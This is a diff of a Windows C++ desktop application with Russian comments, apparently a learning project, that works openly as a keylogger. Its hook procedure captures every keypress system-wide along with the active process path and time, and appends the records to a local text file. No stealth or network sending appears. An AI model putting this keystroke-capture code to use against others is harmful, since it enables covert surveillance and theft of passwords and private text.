@@ -138,22 +138,31 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
             break;
         case OnRecordAction:
 
-            // Меняем текст кнопки в зависимости от состояния
-            if (isRecordStarted) {
-                SetWindowText(hwndRecordButton, L"Начать запись");
+            // Проверяем, был ли выбран путь для записи
+            //if (globalFilePath[0] == 0) {  // Если путь не выбран (пустой)
+                //MessageBoxW(hWnd, L"Пожалуйста, выберите папку для записи файла.", L"Ошибка", MB_OK | MB_ICONERROR);
+            //}
+            //else {
+                // Меняем текст кнопки в зависимости от состояния
+                if (isRecordStarted) {
+                    SetWindowText(hwndRecordButton, L"Начать запись");
 
-                // Удаляем хук, если запись остановлена
-                RemoveKeyboardHook();
-            }
-            else {
-                SetWindowText(hwndRecordButton, L"Остановить запись");
+                    // Удаляем хук, если запись остановлена
+                    RemoveKeyboardHook();
 
-                // Устанавливаем хук, если запись начата
-                SetKeyboardHook();
-            }
+                    //LoadKeyloggerRecordsFromFile(hWnd);
+                    //KeyloggerFilling(hwndListView);
+                }
+                else {
+                    SetWindowText(hwndRecordButton, L"Остановить запись");
 
-            // Переключаем состояние
-            isRecordStarted = !isRecordStarted;
+                    // Устанавливаем хук, если запись начата
+                    SetKeyboardHook();
+                }
+
+                // Переключаем состояние
+                isRecordStarted = !isRecordStarted;
+            //}
 
             break;
         default:
@@ -162,12 +171,11 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
         break;
     }
     case WM_CREATE:
-        //InitializeSharedMemory(hWnd);
         MainWndAddMenues(hWnd);
         MainWndAddWidgets(hWnd);
         break;
     case WM_DESTROY:
-        //CleanupResources();
+        RemoveKeyboardHook();
         PostQuitMessage(0);
         break;
     default:
@@ -191,9 +199,9 @@ void DefineColumns(HWND hwndLV)
 
     ColumnInfo columns[] = {
         { 95, L"ID процесса"},
-        { 325, L"Путь к запущенному процессу" },
-        { 225, L"Дата и время действия" },
-        { 105, L"Код влавиши" },
+        { 425, L"Путь к запущенному процессу" },
+        { 125, L"Дата и время действия" },
+        { 105, L"Код клавиши" },
         { 100, L"Символ" }
     };
 
@@ -208,7 +216,8 @@ void DefineColumns(HWND hwndLV)
     }
 }
 
-
+/*
+// сортировка по убыванию
 void KeyloggerFilling(HWND hwndListView) {
 
     // Удаляем все элементы перед добавлением новых
@@ -243,6 +252,42 @@ void KeyloggerFilling(HWND hwndListView) {
         ListView_SetItemText(hwndListView, static_cast<int>(i), 4, const_cast<LPWSTR>(keyCharText.c_str()));
     }
 }
+*/
+
+void KeyloggerFilling(HWND hwndListView) {
+    // Удаляем все элементы перед добавлением новых
+    ListView_DeleteAllItems(hwndListView);
+
+    // Заполняем таблицу данными в обратном порядке
+    for (int i = static_cast<int>(keyloggerRecords.size()) - 1; i >= 0; --i) {
+        const auto& record = keyloggerRecords[i];
+
+        LVITEM lvItem;
+        lvItem.mask = LVIF_TEXT;
+        lvItem.iItem = static_cast<int>(keyloggerRecords.size()) - 1 - i; // Индекс для верхнего добавления
+        lvItem.iSubItem = 0;  // Индекс первого столбца (ID процесса)
+
+        // Заполнение первого столбца (ID процесса)
+        std::wstring processIdText = std::to_wstring(record.processId);
+        lvItem.pszText = const_cast<LPWSTR>(processIdText.c_str());
+        ListView_InsertItem(hwndListView, &lvItem);
+
+        // 2. Путь к запущенному процессу (столбец 1)
+        ListView_SetItemText(hwndListView, lvItem.iItem, 1, const_cast<LPWSTR>(record.processPath.c_str()));
+
+        // 3. Дата и время действия (столбец 2)
+        ListView_SetItemText(hwndListView, lvItem.iItem, 2, const_cast<LPWSTR>(record.dateTime.c_str()));
+
+        // 4. Код клавиши (столбец 3)
+        std::wstring keyCodeText = std::to_wstring(record.keyCode);
+        ListView_SetItemText(hwndListView, lvItem.iItem, 3, const_cast<LPWSTR>(keyCodeText.c_str()));
+
+        // 5. Символ клавиши (столбец 4)
+        std::wstring keyCharText(1, record.keyChar);
+        ListView_SetItemText(hwndListView, lvItem.iItem, 4, const_cast<LPWSTR>(keyCharText.c_str()));
+    }
+}
+
 
 // Добавление пунктов меню
 void MainWndAddMenues(HWND hwnd) {
@@ -361,7 +406,6 @@ BOOL SelectFolderDialog(HWND hwnd, char* folderPath) {
 }
 
 void CreateFileInSelectedFolder(HWND hwnd) {
-    
     char folderPath[MAX_PATH];
 
     if (SelectFolderDialog(hwnd, folderPath)) {
@@ -373,11 +417,11 @@ void CreateFileInSelectedFolder(HWND hwnd) {
         strftime(fileName, sizeof(fileName), "%d%m%Y-%H%M%S.txt", &tstruct);
 
         // Формируем полный путь к файлу
-        snprintf(filename, MAX_PATH, "%s\\%s", folderPath, fileName);
+        snprintf(globalFilePath, MAX_PATH, "%s\\%s", folderPath, fileName);  // Сохраняем путь в глобальную переменную
 
         // Создаем файл в выбранной папке
         HANDLE hFile = CreateFileA(
-            filename,
+            globalFilePath,  // Используем глобальную переменную для пути
             GENERIC_WRITE,
             0,
             NULL,
@@ -387,11 +431,7 @@ void CreateFileInSelectedFolder(HWND hwnd) {
         );
 
         if (hFile != INVALID_HANDLE_VALUE) {
-            const char* content = "Это новый текстовый файл!";
-            DWORD bytesWritten;
-            WriteFile(hFile, content, strlen(content), &bytesWritten, NULL);
             CloseHandle(hFile);
-
             MessageBoxA(hwnd, "Файл успешно создан!", "Успех", MB_OK | MB_ICONINFORMATION);
         }
         else {
@@ -404,54 +444,107 @@ void CreateFileInSelectedFolder(HWND hwnd) {
 }
 
 
+
+// Функция-словарь для обработки специальных клавиш
+wstring GetKeyStringFromCode(int keyCode) {
+    switch (keyCode) {
+    case VK_RETURN: return L"ENTER";      // Enter
+    case VK_BACK: return L"BACKSPACE";    // Backspace
+    case VK_TAB: return L"TAB";           // Tab
+    case VK_SPACE: return L"SPACE";       // Space
+    case VK_SHIFT: return L"SHIFT";       // Shift
+    case VK_CONTROL: return L"CONTROL";   // Control
+    case VK_MENU: return L"ALT";          // Alt
+    case VK_ESCAPE: return L"ESCAPE";     // Escape
+    case VK_CAPITAL: return L"CAPS LOCK"; // Caps Lock
+    case VK_LSHIFT: return L"LEFT SHIFT"; // Left Shift
+    case VK_RSHIFT: return L"RIGHT SHIFT"; // Right Shift
+    case VK_LCONTROL: return L"LEFT CONTROL"; // Left Control
+    case VK_RCONTROL: return L"RIGHT CONTROL"; // Right Control
+    case VK_LMENU: return L"LEFT ALT";    // Left Alt
+    case VK_RMENU: return L"RIGHT ALT";   // Right Alt
+    default: return L"";                  // Если клавиша не имеет отображаемого текста
+    }
+}
+
+
 // Процедура обработки хука клавиатуры
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION) {
         KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
 
-        DWORD processId;
-        GetWindowThreadProcessId(GetForegroundWindow(), &processId);
+        // Обрабатываем только нажатие клавиш
+        if (wParam == WM_KEYDOWN) {
+            DWORD processId;
+            GetWindowThreadProcessId(GetForegroundWindow(), &processId);
 
-        // Получаем путь к процессу
-        wchar_t processPath[MAX_PATH];
-        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
-        if (hProcess) {
-            DWORD pathLength = GetModuleFileNameExW(hProcess, NULL, processPath, MAX_PATH);
-            CloseHandle(hProcess);
-        }
+            // Получаем путь к процессу
+            wchar_t processPath[MAX_PATH];
+            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
+            if (hProcess) {
+                DWORD pathLength = GetModuleFileNameExW(hProcess, NULL, processPath, MAX_PATH);
+                CloseHandle(hProcess);
+            }
 
-        // Получаем текущее время
-        time_t currentTime = time(NULL);
-        tm timeInfo;
-        localtime_s(&timeInfo, &currentTime);  // Используем localtime_s
+            // Получаем текущее время
+            time_t currentTime = time(NULL);
+            tm timeInfo;
+            localtime_s(&timeInfo, &currentTime);  // Используем localtime_s
 
-        wchar_t dateTime[100];
-        wcsftime(dateTime, sizeof(dateTime), L"%Y-%m-%d %H:%M:%S", &timeInfo);
+            wchar_t dateTime[120];
+            wcsftime(dateTime, sizeof(dateTime), L"%Y-%m-%d %H:%M:%S", &timeInfo);
 
-        // Записываем данные о нажатой клавише
-        KeyloggerRecord record;
-        record.processId = processId;
-        record.processPath = processPath;
-        record.dateTime = dateTime;
-        record.keyCode = pKeyboard->vkCode;
-        record.keyChar = pKeyboard->vkCode > 31 && pKeyboard->vkCode < 127 ? (char)pKeyboard->vkCode : 0;
+            // Получаем состояние клавиатуры
+            BYTE keyboardState[256];
+            GetKeyboardState(keyboardState);  // Состояние клавиш (например, Shift, CapsLock, etc.)
 
-        keyloggerRecords.push_back(record);
+            // Буфер для символов
+            WCHAR szBuffer[10];
+            int nChar = ToUnicode(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, szBuffer, 10, 0);
 
-        // Записываем данные в файл с использованием std::wofstream
-        std::wofstream outFile(L"keylogger_output.txt", std::ios::app);
-        if (outFile.is_open()) {
-            outFile << record.processId << L";"
-                << record.processPath << L";"
-                << record.dateTime << L";"
-                << record.keyCode << L";"
-                << record.keyChar << std::endl;
-            outFile.close();
+            // Создаем запись
+            KeyloggerRecord record;
+            record.processId = processId;
+            record.processPath = processPath;
+            record.dateTime = dateTime;
+            record.keyCode = pKeyboard->vkCode;
+
+
+            // Если символ был получен
+            if (nChar > 0) {
+                record.keyChar = szBuffer[0];  // Символ клавиши
+            }
+            // Если символ не был получен, проверяем на специальные клавиши
+            else {
+                std::wstring keyString = GetKeyStringFromCode(pKeyboard->vkCode);
+                record.keyChar = keyString.empty() ? 0 : keyString[0];  // Если строка не пуста, берем первый символ
+            }
+
+            // Записываем в файл только если путь был выбран
+            if (globalFilePath[0] != 0) {  // Если путь не пуст
+                //std::wofstream outFile(globalFilePath, std::ios::app);
+                std::wofstream outFile(L"keylogger_output.txt", std::ios::app);
+                if (outFile.is_open()) {
+                    outFile << record.processId << L";"
+                        << record.processPath << L";"
+                        << record.dateTime << L";"
+                        << record.keyCode << L";"
+                        << record.keyChar << std::endl;
+                    outFile.close();
+                }
+            }
+
+            // Добавляем запись в список (если нужно)
+            keyloggerRecords.push_back(record);
+
         }
     }
 
+    KeyloggerFilling(hwndListView);
+
     return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
 }
+
 
 
 // Установка хука
